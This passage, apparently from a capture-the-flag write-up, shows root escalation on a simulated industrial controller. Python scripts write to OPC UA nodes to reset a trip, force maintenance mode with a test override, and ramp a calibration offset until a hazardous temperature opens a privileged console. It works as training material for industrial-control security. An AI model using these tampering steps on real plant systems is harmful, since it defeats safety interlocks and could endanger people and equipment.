        await client.get_node("ns=2;i=6").write_value(0.0)
        print("[+] CalibrationOffset reset to 0.0")
        # Request trip reset
        await client.get_node("ns=2;i=14").write_value(True)
        print("[+] ResetTrip requested")

asyncio.run(main())
```
- Running it (can double check with browse2.py if the values are set right):
```
python3 reset.py
---OUTPUT---
[+] CalibrationOffset reset to 0.0
[+] ResetTrip requested
```
![[Pasted image 20260512085028.png]]
- Switch to maintenance mode: `maintenace.py`:
```
import asyncio
from asyncua import Client

async def main():
    async with Client("opc.tcp://127.0.0.1:4840/helix/") as client:
        await client.get_node("ns=2;i=12").write_value("MAINTENANCE")
        print("[+] Mode set to MAINTENANCE")
        await client.get_node("ns=2;i=13").write_value(True)
        print("[+] TestOverride enabled")

asyncio.run(main())
```
- Running it:
```
python3 maintenance.py

---OUTPUT---
[+] Mode set to MAINTENANCE
[+] TestOverride enabled
```
![[Pasted image 20260512085000.png]]
- Finally we slowly ramp calibration offset to the required value which will increase the temperature to 295 which is qwhere we can access the maintenance window:
- calib.py
```
import asyncio
from asyncua import Client

async def main():
    async with Client("opc.tcp://127.0.0.1:4840/helix/") as client:
        for offset in [3.0, 6.0, 9.0, 11.0, 12.0]:
            await client.get_node("ns=2;i=6").write_value(float(offset))
            temp = await client.get_node("ns=2;i=4").read_value()
            print(f"[+] Offset: {offset} → Temp: {temp:.2f}°C")
            await asyncio.sleep(3)  # ramp slowly

asyncio.run(main())
```
- Running it:
```
python3 calib.py

---OUTPUT---
[+] Offset: 3.0 → Temp: 284.09°C
[+] Offset: 6.0 → Temp: 287.16°C
[+] Offset: 9.0 → Temp: 290.22°C
[+] Offset: 11.0 → Temp: 293.28°C
[+] Offset: 12.0 → Temp: 295.26°C
```

- Now we can run the sudo command to get a root shell:
```
sudo /usr/local/sbin/helix-maint-console
[+] Privileged maintenance access granted
[!] Window expires in 109 seconds
[!] Session will be terminated automatically
root@helix:/home/operator#
```

![[Pasted image 20260512084855.png]]

- I get root flag:
![[Pasted image 20260512084935.png]]

----
- We can also see the conditions required to enter the maintenance window without tripping it:
`
```
curl -s http://127.0.0.1:8081 | grep -E "Temperature|Pressure|Maintenance|Window"


<small>Maintenance window is NOT the same as MAINTENANCE mode. Window opens only when safety controller authorizes it under hazardous test conditions.</small>
    <p>Temperature: <b class="warn">296.0 °C</b></p>
    <p>Pressure: <b class="ok">69.00 bar</b></p>
  <h2>Privileged Maintenance Window</h2>
    This window is granted by the safety controller only when a hazardous test condition is detected (e.g., Temp ≥ 295°C or Pressure ≥ 73 bar) while still below trip
```